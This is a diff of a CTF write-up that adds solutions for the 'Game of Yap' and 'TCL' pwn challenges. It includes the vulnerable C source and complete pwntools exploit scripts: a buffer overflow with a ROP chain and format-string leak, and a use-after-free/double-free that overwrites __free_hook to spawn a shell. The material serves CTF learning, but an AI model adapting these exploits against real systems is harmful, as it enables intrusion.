@@ -5,7 +5,7 @@ image: '../../img/cover_photo_wup_imresizer.png'
 date: 2025-05-26
 tags: ['2025', 'PWN', 'WriteUp']
 authors: ['kdot']
-draft: true
+draft: false
 pinned: false
 ---
 
@@ -40,16 +40,16 @@ __attribute__((constructor)) void flush_buf() {
     setbuf(stderr, NULL);
 }
 
-typedef struct {            // 0x18 bytes
-    long uid;               // 0x8 bytes
-    char username[8];       // 0x8 bytes
-    long keycard;           // 0x8 bytes
+typedef struct {
+    long uid;
+    char username[8];
+    long keycard;
 } user_t;
 
 typedef struct {
-    long mfg_date;         // 0x8 bytes
-    char first[8];         // 0x8 bytes
-    char last[8];          // 0x8 bytes
+    long mfg_date;
+    char first[8];
+    char last[8];
 } nametag_t;
 
 long UID = 0x1;
@@ -63,24 +63,18 @@ void init() {
 }
 
 
-// Malloc -> tạo vùng nhớ trên heap malloc(size)
 void register_user() {
     printf("WELCOME!! We're so excited to have you here! Tell us your username / tag and we'll get you set up with access to the facilities!\n");
     curr_user = (user_t*)malloc(sizeof(user_t)); // 0x18 bytes
     curr_user->uid = UID++;
     printf("Please go ahead an type your username now: \n");
     read(0, curr_user->username, 8);
-
-    // 0 - STDIM
-    // 1 - STDOUT
-    // 2 - STDERR
 }
 
 void log_out() {
     free(curr_user);
     curr_user = NULL;
 
-    // Nếu nametag ko có dữ liệu ko free
     if (curr_nametag != NULL) {
         free(curr_nametag);
         curr_nametag = NULL;
@@ -294,7 +288,7 @@ sl(b"7")
 
 interactive()
 ```
-
+---
 ## GOAT
 
 ### Challenge Information
@@ -460,6 +454,695 @@ payload = payload.ljust(0x10)
 payload += p64(exe.got.puts)
 sl(payload)
 sl("A")
+
+interactive()
+```
+---
+## Game of Yap
+
+### Challenge Information
+<Challenge
+  authors={["deltabluejay"]}
+  category="pwn"
+  description="yap yap yap."
+  flag="byuctf{heres_your_yap_plus_certification_c13abe01}"
+>
+</Challenge>
+
+### Solution
+
+The binary have Buffer Overflow bug and we can use that to call the function that give us a binary address. After that use `0x1243: mov rdi, rsi ; ret ;` to control the first argument of printf which can able us to perform some `Format String` attack
+
+```py title="exploit.py" collapse={1-31}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+# context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./game-of-yap_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+brva 0x0123A
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv)
+
+# ==================== EXPLOIT ====================
+p = start()
+
+offset = 0x108
+
+payload = b'A'*(offset) + p8(0x80)
+
+sleep(0.5)
+sa(b'chance...\n',payload)
+exe.address = hexleak(rl()[:-1]) - 0x1210
+
+success(b'pie base @ %#x', exe.address)
+
+if args.GDB:
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+
+mov_rdi_rsi = exe.address + 0x1243
+
+payload = b'%27$p'.ljust(offset, b'\0') + p64(mov_rdi_rsi) + p64(exe.plt.printf) + p64(exe.sym.play)
+sleep(0.5)
+sa(b'try...\n', payload)
+
+libc.address = hexleak(rb(16)) - 0x2a28b
+success('libc base @ %#x', libc.address)
+
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = pop_rdi + 1
+
+payload = b'A'*offset + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\0')))+ p64(libc.sym.system)
+
+sleep(0.5)
+s(payload)
+
+interactive()
+```
+---
+## TCL
+
+### Challenge Information
+
+<Challenge
+  authors={["Legoclones"]}
+  category="pwn"
+  description="I created my own Tiny Config Language and even a little parser for it - you should try it out!"
+  flag="byuctf{ok4y_y34h_th4t_d3fin1t3ly_suck3d}"
+>
+</Challenge>
+
+### Solution
+
+This challenge was challenge 1 solve during CTF. And I couldn't solve it during that time, but luckily my friend was the one who did first blood this challenge and after the tournament he told me there was a way without using Race Coditions. Shout out to @Lieu
+
+<details id="src">
+<summary>Souce code</summary>
+<p>
+```c title="tcl.c"
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdbool.h>
+#include <ctype.h>
+#include <pthread.h>
+#include <unistd.h>
+
+enum {
+    TYPE_FLOAT = 0,
+    TYPE_INT,
+    TYPE_STRING,
+    TYPE_BOOL,
+};
+
+struct str_object {
+    char *value;
+    unsigned int type;
+    unsigned int refcount;
+};
+
+struct int_object {
+    unsigned long value;
+    unsigned int type;
+    unsigned int refcount;
+};
+
+struct float_object {
+    double value;
+    unsigned int type;
+    unsigned int refcount;
+};
+
+struct bool_object {
+    unsigned long value;
+    unsigned int type;
+    unsigned int refcount;
+};
+
+void* objects[100];
+
+__attribute__((constructor)) void flush_buf() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+
+void win() {
+    system("/bin/sh");
+    exit(0);
+}
+
+int create_string_obj(char *value) {
+    struct str_object* obj = (struct str_object*)objects[0];
+    unsigned int i = 0;
+
+    // if the object already exists, just increase the refcount
+    while (obj != NULL) {
+        if ((obj->type == TYPE_STRING) && (strcmp(obj->value, value) == 0)) {
+            printf("Added refcount to %s\n", obj->value);
+            obj->refcount++;
+            return 0;
+        }
+        if (i >= 99) {
+            puts("object array is full");
+            return -1;
+        }
+        i++;
+        obj = (struct str_object*)objects[i];
+    }
+
+    // otherwise, create a new object
+    obj = (struct str_object*)malloc(sizeof(struct str_object));
+    if (obj == NULL) {
+        puts("malloc failed");
+        exit(1);
+    }
+    obj->value = strdup(value);
+    if (obj->value == NULL) {
+        puts("strdup failed");
+        exit(1);
+    }
+    obj->type = TYPE_STRING;
+    obj->refcount = 1;
+    objects[i] = obj;
+    return 0;
+}
+
+int create_int_obj(unsigned long value) {
+    struct int_object* obj = (struct int_object*)objects[0];
+    unsigned int i = 0;
+
+    // if the object already exists, just increase the refcount
+    while (obj != NULL) {
+        if ((obj->type == TYPE_INT) && (obj->value == value)) {
+            printf("Added refcount to %lu\n", obj->value);
+            obj->refcount++;
+            return 0;
+        }
+        if (i >= 99) {
+            puts("object array is full");
+            return -1;
+        }
+        i++;
+        obj = (struct int_object*)objects[i];
+    }
+
+    // otherwise, create a new object
+    obj = (struct int_object*)malloc(sizeof(struct int_object));
+    if (obj == NULL) {
+        puts("malloc failed");
+        exit(1);
+    }
+    obj->value = value;
+    obj->type = TYPE_INT;
+    obj->refcount = 1;
+    objects[i] = obj;
+    return 0;
+}
+
+int create_float_obj(double value) {
+    struct float_object* obj = (struct float_object*)objects[0];
+    unsigned int i = 0;
+
+    // if the object already exists, just increase the refcount
+    while (obj != NULL) {
+        if ((obj->type == TYPE_FLOAT) && (obj->value == value)) {
+            printf("Added refcount to %lf\n", obj->value);
+            obj->refcount++;
+            return 0;
+        }
+        if (i >= 99) {
+            puts("object array is full");
+            return -1;
+        }
+        i++;
+        obj = (struct float_object*)objects[i];
+    }
+
+    // otherwise, create a new object
+    obj = (struct float_object*)malloc(sizeof(struct float_object));
+    if (obj == NULL) {
+        puts("malloc failed");
+        exit(1);
+    }
+    obj->value = value;
+    obj->type = TYPE_FLOAT;
+    obj->refcount = 1;
+    objects[i] = obj;
+    return 0;
+}
+
+int create_bool_obj(unsigned long value) {
+    struct bool_object* obj = (struct bool_object*)objects[0];
+    unsigned int i = 0;
+
+    // if the object already exists, just increase the refcount
+    while (obj != NULL) {
+        if ((obj->type == TYPE_BOOL) && (obj->value == value)) {
+            printf("Added refcount to %lu\n", obj->value);
+            obj->refcount++;
+            return 0;
+        }
+        if (i >= 99) {
+            puts("object array is full");
+            return -1;
+        }
+        i++;
+        obj = (struct bool_object*)objects[i];
+    }
+
+    // otherwise, create a new object
+    obj = (struct bool_object*)malloc(sizeof(struct bool_object));
+    if (obj == NULL) {
+        puts("malloc failed");
+        exit(1);
+    }
+    obj->value = value;
+    obj->type = TYPE_BOOL;
+    obj->refcount = 1;
+    objects[i] = obj;
+    return 0;
+}
+
+void clear_objects() {
+    for (unsigned int i = 0; i < 100; i++) {
+        if (objects[i] != NULL) {
+            // set refcount to 0 for the garbage collector to free
+            struct str_object* obj = (struct str_object*)objects[i];
+            obj->refcount = 0;
+        }
+    }
+}
+
+void parse_tcl() {
+    char buf[0x100];
+    bool valid = true;
+    bool started = false;
+
+    while (1) {
+        // clear the buffer
+        memset(buf, 0, sizeof(buf));
+
+        // we use fgets because it breaks on \n, which means the config line is done
+        fgets(buf, sizeof(buf), stdin);
+
+        // remove the newline character
+        size_t len = strlen(buf);
+        if (len > 0 && buf[len - 1] == '\n') {
+            buf[len - 1] = '\0';
+        }
+        // check for empty line
+        if (strlen(buf) == 0) {
+            continue;
+        }
+
+        if (started == false) {
+            // check for the start of the config
+            if (strcmp(buf, "#START") != 0) {
+                puts("You need to start with #START");
+                continue;
+            }
+            started = true;
+            continue;
+        }
+
+        if (strcmp(buf, "#END") == 0) {
+            break;
+        }
+
+        // check for ' = '
+        char * delim = strstr(buf, " = ");
+        if (delim == NULL) {
+            puts("Invalid line, no ' = ' found");
+            valid = false;
+            continue;
+        }
+        *delim = '\0'; // replace ' = ' with '\0' to split the string
+        delim += 3; // move past the ' = '
+        // at this point, buf contains the key name and delim points to the value
+
+        // ensure first character is not a digit
+        if (isdigit(buf[0])) {
+            puts("Key name cannot start with a digit");
+            valid = false;
+            continue;
+        }
+
+        // check character set in keyname
+        for (char *p = buf; *p != '\0'; p++) {
+            if (!isalnum(*p) && *p != '_') {
+                puts("Key name can only contain alphanumeric characters and underscores");
+                valid = false;
+                continue;
+            }
+        }
+
+        // create an object to store key name
+        if (create_string_obj(buf) != 0) {
+            puts("create_string_obj failed");
+            valid = false;
+            continue;
+        }
+
+        // CHECK THE VALUE NOW
+
+        // inspecting the first character of the value will tell us what type it is
+        if (isdigit(delim[0])) {
+            // it's an int or float
+            char *endptr;
+            unsigned long value = strtoul(delim, &endptr, 10);
+            if (*endptr == '.') {
+                // it's a float
+                double fvalue = strtod(delim, NULL);
+                if (create_float_obj(fvalue) != 0) {
+                    puts("create_float_obj failed");
+                    valid = false;
+                    continue;
+                }
+            } else {
+                // it's an int
+                if (create_int_obj(value) != 0) {
+                    puts("create_int_obj failed");
+                    valid = false;
+                    continue;
+                }
+            }
+        }
+
+        else if (delim[0] == 't' || delim[0] == 'f') {
+            if (strcmp(delim, "true") != 0 && strcmp(delim, "false") != 0) {
+                puts("Invalid boolean value");
+                valid = false;
+                continue;
+            }
+
+            // it's a bool
+            unsigned long value = (delim[0] == 't') ? 1 : 0;
+            if (create_bool_obj(value) != 0) {
+                puts("create_bool_obj failed");
+                valid = false;
+                continue;
+            }
+        }
+
+        else if (delim[0] == '"') {
+            // it's a string
+            delim++; // move past the opening quote
+            char *end = strchr(delim, '"');
+            if (end == NULL) {
+                puts("Invalid string value, no closing quote found");
+                valid = false;
+                continue;
+            }
+            *end = '\0'; // replace closing quote with null terminator
+            if (create_string_obj(delim) != 0) {
+                puts("create_string_obj failed");
+                valid = false;
+                continue;
+            }
+        }
+
+        else {
+            // invalid value type
+            puts("Invalid value type");
+            valid = false;
+            continue;
+        }
+    }
+
+    // check if the config is valid
+    if (valid) {
+        puts("Config is valid");
+    } else {
+        puts("Config is invalid");
+    }
+
+    // set the refcount of all objects to 0
+    clear_objects();
+}
+
+void gc() {
+    unsigned int indexes[100];
+    unsigned int count = 0;
+
+    while (1) {
+        memset(indexes, 0, sizeof(indexes));
+        count = 0;
+        sleep(5);
+
+        // store the indexes of all objects with refcount 0
+        for (unsigned int i = 0; i < 100; i++) {
+            if (objects[i] != NULL) {
+                struct str_object* obj = (struct str_object*)objects[i];
+                if (obj->refcount == 0) {
+                    indexes[count++] = i;
+                }
+            }
+        }
+
+        // free them
+        for (unsigned int i = 0; i < count; i++) {
+            struct str_object* obj = (struct str_object*)objects[indexes[i]];
+            if (obj != NULL) {
+                if (obj->type == TYPE_STRING)
+                    free(obj->value);
+                free(obj);         // Use-After-Free
+                usleep(5 * 1000); // sleep for 5 milliseconds - we don't want to hog the CPU!
+            }
+        }
+
+        // set the object pointer to NULL
+        for (unsigned int i = 0; i < count; i++) {
+            struct str_object* obj = (struct str_object*)objects[indexes[i]];
+            // double check refcount is 0 before setting to NULL
+            if (obj != NULL && obj->refcount == 0) {
+                objects[indexes[i]] = NULL;
+            }
+        }
+    }
+}
+
+int main() {
+    alarm(60); // set a timeout for the program
+    printf("%p\n", &alarm);
+
+    // spawn garbage collector
+    pthread_t tid;
+    pthread_create(&tid, NULL, (void*)gc, NULL);
+
+    while (1) {
+        puts("Enter your TCL file contents below:");
+        puts("=========================================");
+        parse_tcl();
+    }
+
+    return 0;
+}
+```
+</p>
+</details>
+
+The code is quite long but we will pay attention to some key points as follows:
+- There is `Use-After-Free` in the `gc` function, this function will run every `5s` and it will free any objects that have `refcount == 0`
+- In the `create_string_obj` function, `strdup` will let us customize the size of a malloc chunk through the length of the string
+
+With the idea of ​​triggering `malloc_consolidate()` to move the chunks in fastbin to unsortedbin, from a singly linked list to a doubly linked list, we will be able to cause Double Free. Below is a demo program for that
+
+```c title="demo.c"
+// gcc -o test test.c -g -no-pie
+#include <stdio.h>
+#include <stdlib.h>
+
+void main()
+{
+    void *a[10], *b[10];
+
+    for (int i = 0; i < 2; i++)
+        a[i] = malloc(0x18);
+
+    for (int i = 2; i < 10; i++)
+    {
+        a[i] = malloc(0x18);
+        b[i] = malloc(0x88);
+    }
+
+    for (int i = 0; i < 2; i++)
+        free(a[i]);
+
+    for (int i = 2; i < 10; i++)
+    {
+        free(b[i]);
+        free(a[i]);
+    }
+}
+```
+And once we free all the chunk we have, check `bins` again and we can see some speical things
+
+```sh title="GDB"
+pwndbg> bins
+tcachebins
+0x20 [  7]: 0x4055a0 —▸ 0x4054f0 —▸ 0x405440 —▸ 0x405390 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0
+0x90 [  7]: 0x405720 —▸ 0x405670 —▸ 0x4055c0 —▸ 0x405510 —▸ 0x405460 —▸ 0x4053b0 —▸ 0x405300 ◂— 0
+fastbins
+0x20: 0x4057a0 ◂— 0
+unsortedbin
+all: 0x405640 —▸ 0x4056f0 —▸ 0x7ffff7f9cce0 (main_arena+96) ◂— 0x405640 /* '@V@' */
+smallbins
+empty
+largebins
+empty
+```
+This is done by [this code](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4648-L4674). When the `0x80` chunk consolidates with the top chunk, it continues to check that chunk for the new size with `FASTBIN_CONSOLIDATION_THRESHOLD` and to make sure that this chunk size is larger, `malloc_consolidate()` will be called. With that in mind, here is my exploit.
+
+```py title="exploit.py" collapse={1-41, 65-112}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./tcl_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+# init-gef-bata
+set resolve-heap-via-heuristic force
+set follow-fork-mode parent
+b *0x40174F
+b *0x4018AC
+b *0x400EFA
+b *0x400DB3
+b *0x400D86
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("0", 5004)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, aslr=False)
+
+def debug():
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+# ==================== EXPLOIT ====================
+p = start()
+
+libc.address = hexleak(rl()[:-1]) - libc.sym.alarm
+success('libc base @ %#x', libc.address)
+
+ru(b'=========================================\n')
+
+sl(b'#START')
+for i in range(8):
+    chunk = str(i).encode() * 0x87
+    sl(b'A = "' + chunk + b'"')
+sl(b'#END')
+
+sleep(6)
+
+sl(b'#START')
+payload = b"B" * 0x27 + b' = "' + b'8' + b'"'
+sl(payload)
+sl(b"#END")
+
+sleep(6)
+
+'''
+0x4f297 execve("/bin/sh", rsp+0x40, environ)
++----------+-----------------------------------------+
+| Result   | Constraint                              |
++==========+=========================================+
+| SAT      | address rsp+0x50 is writable            |
++----------+-----------------------------------------+
+| SAT      | rsp & 0xf == 0                          |
++----------+-----------------------------------------+
+| UNKNOWN  | {"sh", "-c", r12, NULL} is a valid argv |
++----------+-----------------------------------------+
+
+0x4f29e execve("/bin/sh", rsp+0x40, environ)
++----------+-------------------------------------------------------+
+| Result   | Constraint                                            |
++==========+=======================================================+
+| SAT      | address rsp+0x50 is writable                          |
++----------+-------------------------------------------------------+
+| SAT      | rsp & 0xf == 0                                        |
++----------+-------------------------------------------------------+
+| SAT      | rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv |
++----------+-------------------------------------------------------+
+
+0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
++----------+------------------------------------------------------+
+| Result   | Constraint                                           |
++==========+======================================================+
+| SAT      | address rsp+0x50 is writable                         |
++----------+------------------------------------------------------+
+| SAT      | rsp & 0xf == 0                                       |
++----------+------------------------------------------------------+
+| SAT      | rcx == NULL || {rcx, rax, r12, NULL} is a valid argv |
++----------+------------------------------------------------------+
+
+0x4f302 execve("/bin/sh", rsp+0x40, environ)
++----------+---------------------------------------------------------------------------------------------+
+| Result   | Constraint                                                                                  |
++==========+=============================================================================================+
+| UNKNOWN  | [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv |
++----------+---------------------------------------------------------------------------------------------+
+
+0x10a2fc execve("/bin/sh", rsp+0x70, environ)
++----------+---------------------------------------------------------------------------------------------+
+| Result   | Constraint                                                                                  |
++==========+=============================================================================================+
+| SAT      | [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv |
++----------+---------------------------------------------------------------------------------------------+
+'''
+
+sl(b'#START')
+payload = b"C" * 0x27 + b' = "' + p64(libc.sym.__free_hook-8)[:6] + b'"'
+sl(payload)
+
+payload = b"C" * 0x27 + b' = "' + b"Y" * 0x27 + b'"'
+sl(payload)
+
+payload = b"C" * 0x27 + b' = "' + b"A" * 8 + p64(libc.address + 0x10a2fc)[:6] + b'"'
+sl(payload)
+sl(b"#END")
+sleep(6)
 
 interactive()
 ```
